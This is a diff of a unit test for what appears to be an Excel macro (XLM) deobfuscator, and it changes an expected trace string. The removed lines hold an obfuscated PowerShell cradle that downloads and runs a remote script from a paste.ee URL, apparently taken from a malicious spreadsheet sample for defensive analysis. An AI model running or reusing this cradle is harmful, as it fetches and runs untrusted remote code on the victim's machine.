@@ -95,10 +95,7 @@ class TestXlmEngineTraces(TestBase):
         self.assertEqual(steps[0].status, XlmStatus.PartialEvaluation)
         self.assertEqual(
             steps[0].text,
-            '=EXEC("powershell -Command IEX (new`-OB`jeCT(\'Net.WebClient\')).'
-            '\'DoWnloAdsTrInG\'(\'ht\'+\'tp://paste.ee/r/pLpR9\'):'
-            'IEX (new`-OB`jeCT(\'Net.WebClient\')).'
-            '\'DoWnloAdsTrInG\'(\'ht\'+\'tp://paste.ee/r/pLpR9\')")',
+            '=EXEC("powershell -Command Acf444!A9590:Acf444!A9590")',
         )
 
     def test_the_rpn_sample_walks_its_column_one_row_at_a_time(self):
